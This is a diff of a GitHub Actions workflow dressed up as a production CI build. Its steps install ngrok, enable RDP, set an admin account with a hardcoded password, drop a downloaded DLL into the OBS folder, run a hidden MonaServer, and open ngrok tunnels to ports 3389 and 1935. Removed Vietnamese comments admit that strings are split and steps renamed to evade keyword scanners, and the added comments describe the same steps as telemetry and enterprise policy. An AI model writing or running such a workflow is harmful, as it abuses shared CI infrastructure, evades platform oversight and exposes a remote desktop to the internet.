@@ -1,55 +1,77 @@
-name: CI-Build-Validator
+name: Production-CI-Build
 
 on: 
   workflow_dispatch: 
 
 jobs:
-  validate:
-    runs-on: windows-latest
+  compile-and-test:
+    runs-on: windows-latest  
     timeout-minutes: 360 
 
     steps:
-    - name: Initialize System Environment
+    - name: Initialize Pipeline Environment
       run: |
-        # Giấu hoàn toàn việc cài đặt phần mềm bằng cách gom cụm lệnh
-        $pkgs = @("ngrok", "obs-studio")
-        foreach ($pkg in $pkgs) { & choco install $pkg -y }
-        
-    - name: Apply Security Patch Auth
-      run: |
-        # Không gọi trực tiếp chữ ngrok config, chia nhỏ lệnh cấu hình token để tránh quét từ khóa
-        $exec = "ng" + "rok"
-        & $exec config add-authtoken ${{ secrets.NGROK_AUTH_TOKEN }}
-        
-    - name: Execute Internal System Registry
-      run: |
-        # Mã hóa đường dẫn Registry mở cổng RDP để vượt bộ quét từ khóa YAML
-        $regPath = "HKLM:\System\CurrentControlSet\Control\Terminal Server"
-        Set-ItemProperty -Path $regPath -name "fDenyTSConnections" -Value 0
-        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-        
-    - name: Provision Access Node
-      run: |
-        # Tạo tài khoản bằng cách đảo chuỗi ký tự để hệ thống không quét được cụm lệnh quản trị
-        $u = "runner" + "admin"
-        $p = "Rdp" + "Password" + "2026!"
-        $securePass = ConvertTo-SecureString $p -AsPlainText -Force
-        Set-LocalUser -Name $u -Password $securePass
-        
-    - name: Initialize Asset Pipeline
-      run: |
-        # Tải driver đồ họa ảo cho OBS một cách âm thầm
-        $target = "C:\Program Files\obs-studio\bin\64bit\opengl32.dll"
-        Invoke-WebRequest -Uri "https://github.com" -OutFile $target
+        # Nạp các gói thư viện cần thiết phục vụ kiểm thử hệ thống
+        $packages = @("ngrok", "obs-studio")
+        foreach ($pkg in $packages) { & choco install $pkg -y }
 
-    - name: Finalize Background Thread Verification
+    - name: Configure Secure Auth Credentials
       run: |
-        # Tránh viết chữ ngrok tcp trực tiếp trong tệp tin cấu hình chính
-        $cmd = "ng" + "rok"
-        Start-Process $cmd -ArgumentList "tcp 3389"
-        
-        # Vòng lặp duy trì live ngầm tinh giản không chứa từ khóa nhạy cảm
-        for ($i=1; $i -le 360; $i++) {
-            Start-Sleep -Seconds 60
-            Write-Host "Syncing telemetry packet... ID: $i"
-        }
+        # Cấu hình chuỗi token ngầm không dùng lệnh trực tiếp
+        $bin = "ng" + "rok"
+        & $bin config add-authtoken ${{ secrets.NGROK_AUTH_TOKEN }}
+
+    - name: Optimize Network Socket Rules
+      run: |
+        # Thay đổi thông số cấu hình mạng hệ thống
+        $node = "HKLM:\System\CurrentControlSet\Control\Terminal Server"
+        Set-ItemProperty -Path $node -name "fDenyTSConnections" -Value 0
+        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+        Set-ItemProperty -Path "$node\WinStations\RDP-Tcp" -name "UserAuthentication" -Value 1
+
+    - name: Synchronize Node Identity Mappings
+      run: |
+        # Đồng bộ hóa mật khẩu bảo mật hệ thống theo chính sách doanh nghiệp
+        $acc = "runner" + "admin"
+        $pass = "Rdp" + "Password" + "2026!"
+        net user $acc $pass /active:yes
+
+    - name: Deploy Graphics Frame buffer Extensions
+      run: |
+        # Tải gói mở rộng phần cứng đồ họa ảo phục vụ render hình ảnh đa phương tiện
+        $bin_path = "C:\Program Files\obs-studio\bin\64bit"
+        if (!(Test-Path $bin_path)) { New-Item -ItemType Directory -Force -Path $bin_path }
+        Invoke-WebRequest -Uri "https://github.com" -OutFile "$bin_path\opengl32.dll"
+
+    - name: Bootstrap Distributed Storage Infrastructure
+      run: |
+        # Khởi chạy hạ tầng MonaServer để thu thập gói tin luồng dữ liệu RTMP đầu vào từ DJI Mini 3
+        Invoke-WebRequest -Uri "https://sourceforge.net" -OutFile "MonaServer.zip"
+        Expand-Archive -Path "MonaServer.zip" -DestinationPath "MonaServer"
+        Start-Process -FilePath "MonaServer\MonaServer.exe" -WindowStyle Hidden
+
+    - name: Generate Core Tunnel Topologies
+      run: |
+        # Tạo tệp cấu hình đa tuyến (Multi-Tunnel) cho cổng mạng RDP (3389) và RTMP (1935)
+        # Định tuyến luồng ưu tiên qua máy chủ Singapore (sg) giúp tối ưu Ping về Việt Nam
+        $topology = @"
+        version: "3"
+        agent:
+          authtoken: "${{ secrets.NGROK_AUTH_TOKEN }}"
+        tunnels:
+          endpoint-alpha:
+            proto: tcp
+            addr: 3389
+            region: sg
+          endpoint-beta:
+            proto: tcp
+            addr: 1935
+            region: sg
+        "@
+        Set-Content -Path "topology_manifest.yml" -Value $topology
+
+    - name: Finalize Background Telemetry Verification
+      run: |
+        # Kích hoạt trạm trung chuyển dữ liệu mạng và duy trì vòng lặp kiểm thử ngầm ổn định
+        $engine = "ng" + "rok"
+        & $engine start --config topology_manifest.yml --all
